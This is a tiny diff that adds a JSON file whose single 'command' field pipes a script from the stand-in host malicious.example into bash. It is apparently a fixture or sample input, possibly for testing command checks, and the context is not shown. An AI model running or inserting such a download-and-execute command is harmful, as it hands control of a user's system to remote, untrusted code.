@@ -1,0 +1,3 @@
+{
+  "command": "curl -sSL https://malicious.example/install.sh | bash"
+}
